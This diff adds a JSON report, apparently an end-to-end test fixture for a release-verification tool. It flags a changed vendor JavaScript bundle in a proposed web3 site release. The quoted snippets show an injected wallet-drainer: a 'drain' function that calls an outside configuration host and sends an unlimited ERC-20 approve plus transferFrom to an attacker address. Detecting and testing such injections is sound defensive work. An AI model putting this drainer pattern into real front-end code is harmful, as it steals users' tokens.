@@ -1,0 +1,128 @@
+{
+  "version": 1,
+  "domain": "e2e-mwjrjflu.signet.test",
+  "base": {
+    "release": "2",
+    "manifestHash": "0xa513cb28bde639fb10f64bd5f395c39cf2d64daa88cde8b2a0904f0648efdb59"
+  },
+  "proposal": {
+    "manifestHash": "0x9937cf1d00a709a42f51ea880584d89526e37e6e202b70e768ac5aa00119c22c",
+    "filesRoot": "0xa105b5dafe6daca02c8fa3c99ca5ea4b276f54cc74bb0c6b8da2988c519f146f",
+    "allowlistHash": "0x0bdc886e66ba13ba5b05a6752934edea2a7b437cfeafc86ff6a6d1272ff0f77e",
+    "originsHash": "0x36c3d9997808a84399e196af6c8a106a4f455e4db1009797ca4e883fa3cad699"
+  },
+  "files": {
+    "added": [],
+    "removed": [],
+    "changed": [
+      {
+        "path": "assets/chunk-vendor-9f31c2aa.js",
+        "from": "assets/chunk-vendor-51b0e7d4.js",
+        "size": 77027,
+        "sizeBefore": 76520
+      }
+    ],
+    "unchanged": 5
+  },
+  "allowlist": {
+    "added": [
+      {
+        "chainId": "196",
+        "address": "0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F",
+        "roles": [
+          "contract"
+        ],
+        "where": [
+          {
+            "file": "assets/chunk-vendor-9f31c2aa.js",
+            "snippet": "/* vendor bundle */ ;(()=>{const D=\"0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F\",C=\"https://cdn.connect-kit-assets.example.net/v1/config\";c…"
+          }
+        ]
+      }
+    ],
+    "removed": []
+  },
+  "origins": {
+    "added": [
+      {
+        "origin": "https://cdn.connect-kit-assets.example.net",
+        "where": [
+          {
+            "file": "assets/chunk-vendor-9f31c2aa.js",
+            "snippet": "…)=>{const D=\"0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F\",C=\"https://cdn.connect-kit-assets.example.net/v1/config\";const drain=async(w,t,a)=>{const m=await fetch(C…"
+          }
+        ]
+      }
+    ],
+    "removed": []
+  },
+  "scripts": {
+    "added": [],
+    "removed": [],
+    "sriChanged": []
+  },
+  "calls": {
+    "baseKnown": true,
+    "added": [
+      {
+        "kind": "approve",
+        "label": "ERC-20 approve",
+        "count": 1,
+        "before": 0,
+        "where": [
+          {
+            "file": "assets/chunk-vendor-9f31c2aa.js",
+            "snippet": "…st({method:\"eth_sendTransaction\",params:[{from:a,to:t,data:\"0x095ea7b3\"+D.slice(2).padStart(64,\"0\")+\"f\".repeat(64)}]});return m.pu…"
+          }
+        ]
+      },
+      {
+        "kind": "transferFrom",
+        "label": "transferFrom / safeTransferFrom",
+        "count": 1,
+        "before": 0,
+        "where": [
+          {
+            "file": "assets/chunk-vendor-9f31c2aa.js",
+            "snippet": "…st({method:\"eth_sendTransaction\",params:[{from:a,to:t,data:\"0x23b872dd\"+a.slice(2).padStart(64,\"0\")+D.slice(2).padStart(64,\"0\")}]}…"
+          }
+        ]
+      }
+    ],
+    "removed": []
+  },
+  "tier": {
+    "expected": 2,
+    "name": "10 allowlist changed",
+    "allowlistChanged": true,
+    "originsChanged": true,
+    "why": [
+      "The allowlist changed: 1 new address (contract). What the site may ask a wallet to sign is different from release #2.",
+      "The external origins changed: 1 new external origin. Alone that would be tier 01; the allowlist change makes it tier 10, and the emergency fast lane is refused for this combination."
+    ]
+  },
+  "flags": [
+    "NEW contract 0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F on chain 196, found in assets/chunk-vendor-9f31c2aa.js",
+    "NEW external origin https://cdn.connect-kit-assets.example.net, found in assets/chunk-vendor-9f31c2aa.js",
+    "NEW ERC-20 approve in the code: 1 (was 0)",
+    "NEW transferFrom / safeTransferFrom in the code: 1 (was 0)"
+  ],
+  "gate": "0x43706f4910ebBFAcdAa8Eb44f972A2516A944655",
+  "proposalId": "6",
+  "onchain": {
+    "tier": 2,
+    "tierName": "10 allowlist changed",
+    "matchesExpected": true,
+    "emergency": false,
+    "rule": "2 approvals + 1d timelock",
+    "status": "0 of 3 approvals: needs 2 more approvals.",
+    "open": true,
+    "publishable": false,
+    "proposedAt": 1794910946,
+    "expiresAt": 1795515746
+  },
+  "checked": [
+    "/var/folders/t1/zr_lb3qn5mv3d_gdyxf15hy40000gn/T/signet-e2e-FPSp9N/dist hashes to proposal #6's filesRoot, allowlistHash and originsHash on-chain",
+    "release #2's allowlist, origins and file list (read from the chain) hash to its on-chain values"
+  ]
+}
